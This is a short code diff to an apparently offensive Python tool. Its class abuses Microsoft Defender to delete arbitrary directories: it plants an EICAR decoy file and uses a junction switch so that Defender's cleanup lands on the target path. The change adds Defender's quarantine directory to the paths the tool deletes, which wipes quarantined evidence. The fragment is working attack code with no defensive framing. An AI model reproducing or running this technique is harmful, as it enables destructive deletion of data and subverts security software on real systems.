@@ -11,6 +11,8 @@ class MicrosoftDefenderDeleteProxy(JunctionSwitchDeleteProxy):
     For endpoint in order to delete directories.
     """
 
+    QUARANTINE_DIR = r"C:\ProgramData\Microsoft\Windows Defender\Quarantine"
+
     def __init__(self, decoy_dir_path: str) -> None:
         """
         Read parent class doc.
@@ -38,8 +40,7 @@ class MicrosoftDefenderDeleteProxy(JunctionSwitchDeleteProxy):
                 else:
                     raise NotADirectoryError(f"{type(self).__name__} supports directory deletion only. {path} is not a directory")
 
-        
-        
+        paths_to_delete.append(self.QUARANTINE_DIR)
         return super().indirect_delete_paths(paths_to_delete)
 
     def _before_junction_switch(self, decoy_path: DecoyPath) -> None:
@@ -76,8 +77,7 @@ class MicrosoftDefenderDeleteProxy(JunctionSwitchDeleteProxy):
         Read parent class doc.
         Also, after creating the decoy file, the handle to it is left open and stored so it can be closed later.
         """
-        eicar_file_path = os.path.join(decoy_path.decoy_deepest_dir, os.path.basename(decoy_path.path_to_delete))
-        eicar_file_handle = win32file.CreateFile(eicar_file_path,  win32file.GENERIC_READ | win32file.GENERIC_WRITE, win32file.FILE_SHARE_READ, None, win32file.CREATE_NEW, 0, 0)
+        eicar_file_handle = win32file.CreateFile(decoy_path.decoy_file_path,  win32file.GENERIC_READ | win32file.GENERIC_WRITE, win32file.FILE_SHARE_READ, None, win32file.CREATE_NEW, 0, 0)
         win32file.WriteFile(eicar_file_handle, self._get_decoded_eicar(), None)
         
         self.__target_paths_to_open_handles[decoy_path.path_to_delete] = eicar_file_handle
